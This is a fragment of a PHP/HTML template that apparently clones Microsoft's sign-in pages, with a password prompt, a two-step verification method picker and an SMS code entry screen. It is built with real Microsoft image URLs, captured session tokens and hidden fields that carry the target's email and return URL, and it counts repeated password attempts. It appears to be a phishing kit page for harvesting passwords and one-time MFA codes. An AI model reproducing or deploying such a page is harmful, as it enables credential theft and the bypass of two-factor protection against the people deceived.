                                                                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0Ij48dGl0bGU+YXNzZXRzPC90aXRsZT48cGF0aCBkPSJNMTgsMTEuNTc4di44NDRINy42MTdsMy45MjEsMy45MjgtLjU5NC41OTRMNiwxMmw0Ljk0NC00Ljk0NC41OTQuNTk0TDcuNjE3LDExLjU3OFoiIGZpbGw9IiM0MDQwNDAiLz48cGF0aCBkPSJNMTAuOTQ0LDcuMDU2bC41OTQuNTk0TDcuNjE3LDExLjU3OEgxOHYuODQ0SDcuNjE3bDMuOTIxLDMuOTI4LS41OTQuNTk0TDYsMTJsNC45NDQtNC45NDRtMC0uMTQxLS4wNzEuMDdMNS45MjksMTEuOTI5LDUuODU4LDEybC4wNzEuMDcxLDQuOTQ0LDQuOTQ0LjA3MS4wNy4wNzEtLjA3LjU5NC0uNTk1LjA3MS0uMDctLjA3MS0uMDcxTDcuODU4LDEyLjUyMkgxOC4xVjExLjQ3OEg3Ljg1OGwzLjc1MS0zLjc1Ny4wNzEtLjA3MS0uMDcxLS4wNy0uNTk0LS41OTUtLjA3MS0uMDdaIiBmaWxsPSIjNDA0MDQwIi8+PC9zdmc+">
                                                        </a>
                                                        <div class="identity"></div>
                                                </div>
                                        </div>
                                </div>
                                <div style="" class="enter-pass animate slide-in-next has-identity-banner pagination-view">
                                        <div class="row text-title">Enter <span class="pashold"></span></div>
                                        <div class=row>
                                            <div aria-live="assertive" role="alert" class="error-alert">
                                                    <div class="pass-error alert alert-error error-alert-msg"></div>
													<span class="info-verify">'.($caption ?? "Because you're accessing sensitive info, you need to verify your <span class=\"pashold\"></span>").'</span>
                                            </div>
                                                <div class="form-group col-md-24">
                                                        <div aria-live="assertive" role="alert" style="display: block;" class="error-alert-pass">
                                                                <div style="color:#e81123;" class="alert alert-erro"></div>
                                                        </div>
                                                        <div class=placeholderContainer>
                                                                <input name="password" type="password" id="password" autocomplete="off" class="form-control" placeholder="Password" tabindex="0">
                                                        </div>
                                                </div>
                                        </div>
                                        <div class=position-buttons>
                                                <div>
                                                        <div class=row>
                                                                <div class=col-md-24>
                                                                                <div class="action-links text-13">
                                                                                <div class=form-group><a href="#">Forgot my <span class="pashold"></span></a></div>
                                                                                <div class=form-group></div>
                                                                                <input type="hidden" value="'.$email.'" id="bkupttrferrs" >
                                                                                <input type="hidden" value="'.base64_encode($url).'" id="uurl" >
                                                                        </div>
                                                                </div>
                                                        </div>
                                                </div>
                                                <div class=row >
                                                        <div>
                                                                <div class="button-container col-xs-24 no-padding-left-right">
                                                                        <div class=inline-block>
                                                                                <button class="nextb btn btn-block btn-primary btn-signin">Sign in</button>
                                                                        </div>
                                                                    <input type="hidden" value="0" id="first" >
                                                                    <input type="hidden" value="1" id="repeat" >
                                                                </div>
                                                        </div>
                                                 </div>
                                        </div>
                                </div>
							
								<div style="display:none;" class="show-2fa-code pagination-view has-identity-banner animate slide-in-next" data-bind="css: {
        \'has-identity-banner\': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        \'zero-opacity\': hidePaginatedView.hideSubView(),
        \'animate\': animate(),
        \'slide-out-next\': animate.isSlideOutNext(),
        \'slide-in-next\': animate.isSlideInNext(),
        \'slide-out-back\': animate.isSlideOutBack(),
        \'slide-in-back\': animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-bind="pageViewComponent: { name: \'otc-request-view\',
                    params: {
                        serverData: svr,
                        serverError: initialError,
                        renderProofsInline: true,
                        username: sharedData.username,
                        otcProofs: sharedData.otcProofs,
                        isInitialState: isInitialState,
                        showCancelButton: sharedData.showCancelButton,
                        hideSmsInMfaProofs: sharedData.hideSmsInMfaProofs,
                        focusDefaultField: true },
                    event: {
                        cancel: view_onCancel,
                        redirect: $tfaPage.view_onRedirect,
                        showDebugDetails: $tfaPage.toggleDebugDetails_onClick,
                        setPendingRequest: $tfaPage.view_onSetPendingRequest,
                        updateSessionIdentifier: $tfaPage.view_onUpdateSessionIdentifier,
                        showMoreProofs: $tfaPage.view_onShowMoreProofs } }"><!--  -->

<!-- ko if: defaultProof && sending() --><!-- /ko -->

<!-- ko ifnot: defaultProof && sending() -->
<div id="idDiv_SAOTCS_Title" class="row text-title" role="heading" aria-level="1" data-bind="text: str[\'CT_SAOTCC_STR_Title\']">Verify your identity</div>

<!-- ko if: svr.fIsChallengeDueToAuthenticationStrengths --><!-- /ko -->

<div id="idDiv_SAOTCS_Proofs_Section">
    <!-- ko if: serverError --><!-- /ko -->

    <div id="idDiv_SAOTCS_Proofs" class="form-group" role="list" data-bind="css: { \'binaryChoice list\': svr.fSupportWindowsStyles }" aria-labelledby="idDiv_SAOTCS_Error_OTC idDiv_SAOTCS_Title">
        <!-- ko foreach: { data: proofs } -->
            <!-- ko if: $parent.isProofVisible(type) -->
            <div class="row tile" role="listitem">
                <div class="table" tabindex="0" role="button" data-bind="
                    attr: { \'data-value\': value },
                    css: { \'list-item\': svr.fSupportWindowsStyles },
                    ariaDescribedBy: $data === $parent.focusedProof() ? \'idDiv_SAOTCS_Title\' : null,
                    click: $parent.proof_onClick,
                    pressEnter: $parent.proof_onClick,
                    hasFocus: $data === $parent.focusedProof()" data-value="OneWaySMS" aria-describedby="idDiv_SAOTCS_Title">
                    <div class="table-row">
                        <div class="table-cell tile-img">
                            <div data-bind="component: { name: \'proof-image-control\', params: { type: type } }"><!--  -->

<!-- ko if: type === PROOF.Type.Email --><!-- /ko -->

<!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile -->
    <!-- ko component: \'accessible-image-control\' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img" role="presentation" pngsrc="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsSAAALEgHS3X78AAAAqElEQVRo3u3ZsQ2EMBBE0TG6nFauBLbypQRaoQJfipychZHWxn9jB/M8ILQi5Zw18iwafAAAAAAAwNyAz78DZhb6qXb3NHcDtTfx9NQ2z0sMAAAAAAAAAAAAAACA929k5YZ03dDM7Ctpl7QO10Bk+KoGyl342kQR/pS0ufsxRAM9hG99hMLDtwLCw7cCwsO3ALoIfxfQTfi7gG7CS1LiPzEAAAAATA34AUDqP0bWifNxAAAAAElFTkSuQmCC" svgsrc="data:image/svg+xml;base64,H4sIAAAAAAAEAHWPva7CMAyFXyUya9U4P4iAkg536gBrh7shCE2k0iJiNTz+TS5iRLbkY/vTsWzTOrLXfZqTg0D0OHCec26zapfnyCUi8kIAy/FKwYE2wIKPY6C3XqPPP8vLATJk2pSEzlKkyXfnlDwly9+dffoLfXO5xWlyMC+zB97Zx5kCuzo4KdMoHITsBQ4Kg151u92ZozC1lFWvzEnIRsneDAJ7XajC7lst5bHO/9Xvx36jsUa9UF/q/gCjDUfv+gAAAA==" data-bind="imgSrc, css: { \'small\': small, \'animate-pulse\': animate }" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDQ4IDQ4Ij48dGl0bGU+YXNzZXRzPC90aXRsZT48cmVjdCB3aWR0aD0iNDgiIGhlaWdodD0iNDgiIGZpbGw9Im5vbmUiLz48cGF0aCBkPSJNMzgsMzBWMTJIMTBWMzBoNHY0LjU3OEwxOC41NzgsMzBIMzhNMTIsMzJIOFYxMEg0MFYzMkgxOS40MjJMMTIsMzkuNDIyWiIgZmlsbD0iIzQwNDA0MCIvPjwvc3ZnPg=="><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko -->

<!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice --><!-- /ko -->

<!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 --><!-- /ko -->

<!-- ko if: type === PROOF.Type.TOTPAuthenticator --><!-- /ko -->

<!-- ko if: type === PROOF.Type.FidoKey --><!-- /ko -->

<!-- ko if: type === PROOF.Type.AccessPass --><!-- /ko --></div>
                        </div>
                        <div class="table-cell text-left content click-to-enter" data-bind="css: { \'content\': !svr.fSupportWindowsStyles }">
                            <div data-bind="text: display" class="holder">
								Text <span class="add-text"></span>
							</div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- /ko -->
        
            <!-- ko if: $parent.isProofVisible(type) -->
            <div class="row tile" role="listitem">
                <div class="table" tabindex="0" role="button" data-bind="
                    attr: { \'data-value\': value },
                    css: { \'list-item\': svr.fSupportWindowsStyles },
                    ariaDescribedBy: $data === $parent.focusedProof() ? \'idDiv_SAOTCS_Title\' : null,
                    click: $parent.proof_onClick,
                    pressEnter: $parent.proof_onClick,
                    hasFocus: $data === $parent.focusedProof()" data-value="TwoWayVoiceMobile">
                    <div class="table-row">
                        <div class="table-cell tile-img">
                            <div data-bind="component: { name: \'proof-image-control\', params: { type: type } }"><!--  -->

<!-- ko if: type === PROOF.Type.Email --><!-- /ko -->

<!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile --><!-- /ko -->

<!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice -->
    <!-- ko component: \'accessible-image-control\' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img" role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_call_3fb9c7e87c04ff8f56dd61ef8b748c02.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_call_fe87496cc7a44412f7893a72099c120a.svg" data-bind="imgSrc, css: { \'small\': small, \'animate-pulse\': animate }" src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_call_fe87496cc7a44412f7893a72099c120a.svg"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko -->

<!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 --><!-- /ko -->

<!-- ko if: type === PROOF.Type.TOTPAuthenticator --><!-- /ko -->

<!-- ko if: type === PROOF.Type.FidoKey --><!-- /ko -->

<!-- ko if: type === PROOF.Type.AccessPass --><!-- /ko --></div>
                        </div>
                        <div class="table-cell text-left content click-to-enter" data-bind="css: { \'content\': !svr.fSupportWindowsStyles }">
                            <div data-bind="text: display" class="holder">
								Text <span class="add-text"></span>
							</div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- /ko -->
        <!-- /ko -->
    </div>
</div>

<div data-bind="css: { \'position-buttons\': !tenantBranding.BoilerPlateText }" class="position-buttons">
    <div class="row">
        <!-- ko if: showHaveCodeSection || showMoreProofsLink() || lostProof || svr.urlMoreInfo || svr.fShowAuthMethodsUpdateLink -->
        <div class="col-md-24">
            <div class="text-13">
                <!-- ko if: showHaveCodeSection --><!-- /ko -->
                <!-- ko if: showMoreProofsLink --><!-- /ko -->
                <!-- ko if: lostProof && !showMoreProofsLink() --><!-- /ko -->
                <!-- ko if: svr.urlMoreInfo -->
                <div class="form-group">
                    <a id="moreInfoUrl" target="_blank" href="https://go.microsoft.com/fwlink/p/?LinkId=708614" data-bind="
                        text: str[\'CT_STR_More_Info\'],
                        href: svr.urlMoreInfo,
                        ariaLabel: str[\'CT_STR_More_Info_AriaLabel\']" aria-label="More information about two step verification">More information</a>
                </div>
                <!-- /ko -->
                <!-- ko if: svr.fShowAuthMethodsUpdateLink -->
                <div class="text-13 form-group">
                    <span data-bind="text: str[\'CT_SAOTCS_STR_Update_Auth_Methods_Link\']">Are your verification methods current? Check at https://aka.ms/mfasetup</span>
                </div>
                <!-- /ko -->
            </div>
        </div>
        <!-- /ko -->
    </div>
</div>

<div class="win-button-pin-bottom" data-bind="css : { \'boilerplate-button-bottom\': tenantBranding.BoilerPlateText }">
    <div class="row" data-bind="css: { \'move-buttons\': tenantBranding.BoilerPlateText }">
        <div data-bind="component: { name: \'footer-buttons-field\',
            params: {
                serverData: svr,
                removeBottomMargin: true,
                secondaryButtonId: \'idBtn_SAOTCS_Cancel\',
                secondaryButtonText: secondaryButtonValue(),
                isPrimaryButtonVisible: false,
                isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; showCancelButton },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container no-margin-bottom" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { \'no-margin-bottom\': removeBottomMargin }">

    <!-- ko if: isSecondaryButtonVisible -->
    <div class="inline-block">
        <input type="button" id="idBtn_SAOTCS_Cancel" class="win-button button-secondary button ext-button secondary ext-secondary" data-bind="
            attr: { \'id\': secondaryButtonId || \'idBtn_Back\' },
            externalCss: {
                \'button\': true,
                \'secondary\': true },
            value: secondaryButtonText() || str[\'CT_HRD_STR_Splitter_Back\'],
            ariaDescribedBy: secondaryButtonDescribedBy,
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled" value="Cancel">
    </div>
    <!-- /ko -->

    <div data-bind="css: { \'inline-block\': isPrimaryButtonVisible }">
        <!-- type="submit" is needed in-addition to \'type\' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    \'button\': true,
                    \'primary\': true },
                value: primaryButtonText() || str[\'CT_PWD_STR_SignIn_Button_Next\'],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Next" style="display: none;">
    </div>
</div></div>
    </div>
</div>
<!-- /ko -->

<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
	<div style="display:none;" class="input-code pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        \'has-identity-banner\': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        \'zero-opacity\': hidePaginatedView.hideSubView(),
        \'animate\': animate(),
        \'slide-out-next\': animate.isSlideOutNext(),
        \'slide-in-next\': animate.isSlideInNext(),
        \'slide-out-back\': animate.isSlideOutBack(),
        \'slide-in-back\': animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-showidentitybanner="true" data-bind="pageViewComponent: { name: \'otc-confirm-view\',
                    params: {
                        serverData: svr,
                        serverError: initialError,
                        username: sharedData.username,
                        focusDefaultField: true,
                        supportsBack: true,
                        isInitialState: isInitialState,
                        sentProof: sharedData.sentProof,
                        otcProofs: sharedData.otcProofs,
                        isGeneralVerify: sharedData.isGeneralVerify,
                        proofConfirmation: sharedData.proofConfirmation,
                        showCancelButton: sharedData.showCancelButton,
                        trustedDeviceCheckboxConfig: sharedData.trustedDeviceCheckboxConfig,
                        currentPollStartTime: sharedData.currentPollStartTime,
                        currentPollEndTime: sharedData.currentPollEndTime,
                        sessionIdentifier: sharedData.sessionIdentifier,
                        twoWayPollingNeeded: sharedData.twoWayPollingNeeded,
                        hasTotpV2Only: sharedData.hasTotpV2Only,
                        hasTotpV1Only: sharedData.hasTotpV1Only,
                        flowToken: sharedData.flowToken },
                    event: {
                        cancel: view_onCancel,
                        updateFlowToken: $tfaPage.view_onUpdateFlowToken,
                        showDebugDetails: $tfaPage.toggleDebugDetails_onClick,
                        submitReady: $tfaPage.view_onSubmitReady,
                        setPendingRequest: $tfaPage.view_onSetPendingRequest,
                        setBackButtonState: view_onSetIdentityBackButtonState } }"><!--  -->

<input type="hidden" name="type" data-bind="value: postType" value="18">
<input type="hidden" name="GeneralVerify" data-bind="value: isGeneralVerify" value="false">
<input type="hidden" name="request" data-bind="value: svr.sCtx" value="rQQIARAAhVM9bONkGI6TNqRRC6X86NgqUSR0wsnnf7sS0uWvdtLYJqnT_DBEn_3Zjv_TxInrbDCxUTGAdAPDDQyVWJAQqBNiQXQ6ia3chBgQEgiddLqTWEhhPjG8r96_Z3j1PE-xwJYIskSUwN0cWQKHBzTHMjTN6DhFGixOCzrAecpkcQIJ1HpFcqwBZ3vF3b9_fT-59_GX6jc_fPJW9befPrvE9idxPJ0flstJkpQiy3IMs2REQdmHIXJCe0l-i2EPMex-dtMM8d7JZXbOUhwvMDwBWMDzNMUxbEkOFG-knfqq2IkVrevJDgCyOyTamncua8N4pLUcVUP-qG4TyjrkfieVXY8cunas9HvM6ASA4ap33u43aPl2Vu-s7xRnVO9Ohm4F3GRfUiuLeELepmjmrMzH2S0rmgXjaTSP7-c-zY6PeFnhJxrV4nvzTq2qtqco8uWEdUVHTyWOC1i8ZQJf9FKfEKWl0G3CY4U_o_XQOCIaEylESxSKy2WKFmcrRdLRrC4RpGgREtmFvqWJLGh7tXpQbR1xCm07BGuoMX86WCiwBo5P5ZbVTtKOqkxMRE2WaYPqjBr2yQAyTaRLgqoDtVkbME6L9Soc77ktIKQwkNe8TBvR0jakQYfy4sF5v9e2OabXlc14PmLxhpa4faOC0xUktVaGmSTndaY68YecHjBC4EmSJg_TXj_VEygiVqx17JrFLJIzFnG1Recy98Zz6F2SX-Xy6yKIwqvcAckKlm6aBG6ZAOI0IAgc6mitIQBp1tChSTHoOsdFUzN00P50FlmObz5POUuyrP7bSVFgliq-_0vuABpGtAjje1MfpmvekAUDx08DEzkG9G9RJbh4uIH9vvF6Ib-7fQfbz7z9KsgdFgrF3cydzH7m2Qb2YHOtX-HJzgdP33ysfH198ePV3UHmerNcoWtTu-0GiHf65eYUdh0oUIT7XnmVHvfnrlA7SquRuuCU0fBdcEhc5LGLfP46_3KzPlYa2olWUeqVbp0cg7_y2Y9ewK62_tcRH27vFDJ7W1ur175451H1RrrZfqVYXDhjP1o_Y873_nPKdzuZZy_--eDzR9__fPGH9A81">
<input type="hidden" name="mfaLastPollStart" data-bind="value: currentPollStartTime" value="1653984269198">
<input type="hidden" name="mfaLastPollEnd" data-bind="value: currentPollEndTime" value="1653984271034">

<input type="hidden" data-bind="attr: { name: svr.sAuthMethodInputFieldName }, value: proofData" name="mfaAuthMethod" value="OneWaySMS">

<!-- ko if: svr.canary -->
<input type="hidden" name="canary" data-bind="value: svr.canary" value="A4CpgLjmd8iW/IpaRia931jP/zyKWsj9CFyBoOu7NZY=1:1">
<!-- /ko -->
<!-- ko if: proofConfirmation --><!-- /ko -->

<div id="idDiv_SAOTCC_Title" class="row text-title" role="heading" aria-level="1" data-bind="text: twoWayPollingNeeded ? str[\'CT_SAOTCAS_STR_Title\'] : str[\'CT_SAOTCS_STR_Title\']">Enter code</div>
<div class="row text-body">
    <div data-bind="component: { name: \'proof-image-control\', params: { type: proofImageType, small: true, animate: twoWayPollingNeeded } }"><!--  -->

<!-- ko if: type === PROOF.Type.Email --><!-- /ko -->

<!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile -->
    <!-- ko component: \'accessible-image-control\' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img small" role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_sms_b15dda889e9803e9d6befd60000fadf8.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg" data-bind="imgSrc, css: { \'small\': small, \'animate-pulse\': animate }" src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko -->

<!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice --><!-- /ko -->

<!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 --><!-- /ko -->

<!-- ko if: type === PROOF.Type.TOTPAuthenticator --><!-- /ko -->

<!-- ko if: type === PROOF.Type.FidoKey --><!-- /ko -->

<!-- ko if: type === PROOF.Type.AccessPass --><!-- /ko --></div>
    <div id="idDiv_SAOTCC_Description" class="text-block-body overflow-hidden" data-bind="text: description">We texted your phone <span class="add-text">+X XXXXXXXX71</span>. Please enter the code to sign in.</div>
</div>

<div class="text-block-body">
    <div id="idDiv_SAOTCC_OTCRow" class="form-group">
        <div role="alert" aria-live="assertive">
            <!-- ko if: error --><!-- /ko -->
			<div class="row code-error" >
                <div style="display:none;" id="idDiv_SAOTCC_ErrorMsg_OTC" class="sms-error alert alert-error first">
                    <span id="idSpan_SAOTCC_Error_OTC" data-bind="html: error" class="error-type">You didn\'t enter the expected verification code. Please try again.</span>
                    <!-- ko if: svr.fShowViewDetailsLink -->
                    <a id="ViewDetails" class="no-wrap" href="#" data-bind="
                        text: str[\'CT_STR_Error_ViewDetails\'],
                        clickExpr: onShowDebugDetails(debugDetails, true),
                        ariaLabel: str[\'CT_STR_Error_ViewDetailsAriaLabel\']" aria-label="View debugging details for this error">View details</a>
                    <!-- /ko -->
                </div>
            </div>
        </div>
        <div id="idDiv_SAOTCC_Success_OTC" class="errorDiv" style="display: none;">
            <span id="idSpan_SAOTCC_Success_OTC" class="success"></span>
        </div>
        <!-- ko ifnot: twoWayPollingNeeded || hideInputControls() -->
        <div id="idDiv_SAOTCC_OTC" class="textbox form-group">
            <div class="placeholderContainer" data-bind="component: { name: \'placeholder-textbox-field\',
                publicMethods: otcInputTextbox.placeholderTextboxMethods,
                params: {
                    serverData: svr,
                    hintText: str[\'CT_SAOTCC_STR_OTC_TBHint\'] },
                event: {
                    updateFocus: otcInputTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { \'$placeholderText\': placeholderText } -->
    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

                <input id="idTxtBx_SAOTCC_OTC" name="otc" class="form-control" type="tel" autocomplete="off" aria-required="true" data-bind="
                    attr: {
                        \'maxlength\': otcLength,
                        \'aria-labelledby\': \'idDiv_SAOTCC_Title\',
                        \'aria-describedby\': \'idDiv_SAOTCS_Title idDiv_SAOTCC_Description idSpan_SAOTCC_Error_OTC\' },
                    css: { \'has-error\': error },
                    textInput: otcInputTextbox.value,
                    ariaLabel: str[\'CT_SAOTCC_STR_OTC_TBHint\'],
                    hasFocusEx: otcInputTextbox.focused,
                    placeholder: $placeholderText" maxlength="6" aria-labelledby="idDiv_SAOTCC_Title" aria-describedby="idDiv_SAOTCS_Title idDiv_SAOTCC_Description idSpan_SAOTCC_Error_OTC" aria-label="Code" placeholder="Code">
            <!-- /ko -->
<!-- /ko -->
<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>
        </div>

        <!-- ko if: twoFactorAuthPinEnabled --><!-- /ko -->
        <!-- /ko -->
    </div>
</div>
<div class="text-block-body text-body" data-bind="visible: showSendNotification" style="display: none;">
    <a id="idA_SAOTCC_SendNotification" href="#" data-bind="html: str[\'CT_SAOTCC_STR_SendNotification\'], click: switchToSessionApproval_onClick">Send an identity verification request to my Microsoft Authenticator app.</a>
</div>

<div data-bind="css: { \'position-buttons\': !tenantBranding.BoilerPlateText &amp;&amp; !twoWayPollingNeeded }" class="position-buttons">
    <div class="row">
        <div id="idDiv_SAOTCC_TD_Section" class="no-margin-top-bottom" data-bind="visible: tdCheckbox.isShown &amp;&amp; !hideInputControls()" style="display: none;">
            <div id="idDiv_SAOTCC_TD" class="col-md-24 form-group no-margin-top checkbox">
                <label id="idLbl_SAOTCC_TD_Cb">
                    <input id="idChkBx_SAOTCC_TD" type="checkbox" value="true" data-bind="checked: tdCheckbox.isChecked, disable: tdCheckbox.isDisabled, ariaLabel: str[\'CT_SAOTCC_STR_AddTD\'], attr: { name: svr.sTrustedDeviceCheckboxName }" name="rememberMFA" aria-label="Don\'t ask again for undefined days">
                    <span data-bind="text: str[\'CT_SAOTCC_STR_AddTD\']">Don\'t ask again for undefined days</span>
                </label>
            </div>
        </div>

        <!-- ko if: isInitialState || svr.urlMoreInfo -->
        <div class="col-md-24">
            <div class="text-13">
                <!-- ko if: isInitialState && showSwitchProofsLink -->
                <div class="form-group" id="idDiv_SAOTCS_HavingTrouble" data-bind="
                        htmlWithBindings: str[\'CT_SAOTCC_STR_Toggle\'],
                        childBindings: { \'signInAnotherWay\': { click: switchToOtcRequest_onClick } }">Having trouble? <a href="#" id="signInAnotherWay">Sign in another way</a></div>
                <!-- /ko -->
                <!-- ko if: svr.urlMoreInfo -->
                <div data-bind="css: { \'form-group\': !twoWayPollingNeeded }" class="form-group">
                    <a id="moreInfoUrl" target="_blank" href="https://go.microsoft.com/fwlink/p/?LinkId=708614" data-bind="
                            text: str[\'CT_STR_More_Info\'],
                            href: svr.urlMoreInfo,
                            ariaLabel: str[\'CT_STR_More_Info_AriaLabel\']" aria-label="More information about two step verification">More information</a>
                </div>
                <!-- /ko -->
            </div>
        </div>
        <!-- /ko -->
    </div>
</div>

<div class="win-button-pin-bottom" data-bind="css : { \'boilerplate-button-bottom\': tenantBranding.BoilerPlateText }">
    <div class="row" data-bind="css: { \'move-buttons\': tenantBranding.BoilerPlateText }">
        <div data-bind="component: { name: \'footer-buttons-field\',
            params: {
                serverData: svr,
                removeBottomMargin: true,
                primaryButtonId: \'idSubmit_SAOTCC_Continue\',
                primaryButtonText: str[\'CT_SAOTCC_STR_Continue\'],
                secondaryButtonId: \'idBtn_Back\',
                secondaryButtonText: str[\'CT_SAOTCC_STR_Cancel\'],
                isSecondaryButtonVisible: !showSwitchProofsLink,
                isPrimaryButtonVisible: svr.fShowButtons &amp;&amp; !twoWayPollingNeeded &amp;&amp; !hideInputControls(),
                secondaryButtonDescribedBy: (svr.fShowButtons &amp;&amp; twoWayPollingNeeded) ? \'idDiv_SAOTCC_Description\' : null },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container no-margin-bottom" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { \'no-margin-bottom\': removeBottomMargin }">

    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

    <div data-bind="css: { \'inline-block\': isPrimaryButtonVisible }" class="inline-block">
        <!-- type="submit" is needed in-addition to \'type\' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit" id="idSubmit_SAOTCC_Continue" class="submit-2fa btn btn-block btn-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    \'button\': true,
                    \'primary\': true },
                value: primaryButtonText() || str[\'CT_PWD_STR_SignIn_Button_Next\'],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Verify">
    </div>
</div></div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
